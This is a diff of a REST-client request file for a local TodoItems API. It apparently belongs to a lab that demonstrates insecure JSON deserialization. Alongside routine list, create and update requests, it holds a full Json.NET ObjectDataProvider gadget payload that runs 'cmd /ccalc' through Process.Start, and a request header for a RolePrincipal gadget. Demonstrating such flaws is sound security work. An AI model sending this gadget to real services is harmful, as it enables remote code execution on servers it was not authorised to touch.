@@ -2,12 +2,9 @@
 @port=44355
 
 ### List all items
-
 GET https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
 
 ### create a new task
-
-
 POST https://{{hostname}}:{{port}}/api/TodoItems/0 HTTP/1.1
 content-type: application/json
 
@@ -16,7 +13,6 @@ content-type: application/json
 }
 
 ### update an existing task
-
 PUT https://{{hostname}}:{{port}}/api/TodoItems/0 HTTP/1.1
 content-type: application/json
 
@@ -27,8 +23,6 @@ content-type: application/json
 }
 
 ### send benign metadata
-
-
 POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
 content-type: application/json
 
@@ -46,30 +40,28 @@ content-type: application/json
   }
 }
 
-### send malicious binary data
-
+### send malicious ObjectDataProvider gadget
 POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
 content-type: application/json
 
 {
-  "name": "pwn with ObjectDataProvider",
-  "metadata" : 
-  {
-    "fido": 
+"name": "pwn with ObjectDataProvider",
+"metadata" : 
     {
-        '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-        'MethodName':'Start',
-        'MethodParameters':{
-            '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-            '$values':['cmd','/ccalc']
-        },
-        'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+        "fido": 
+        {
+            "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "MethodParameters":{
+                "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "$values":["cmd","/ccalc"]
+            },
+            "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
+        }
     }
-  }
 }
 
-###
-
+### send malicious RolePrincipal gadget
 POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
 content-type: application/json
 
@@ -84,4 +76,3 @@ content-type: application/json
     }
   }
 }
-
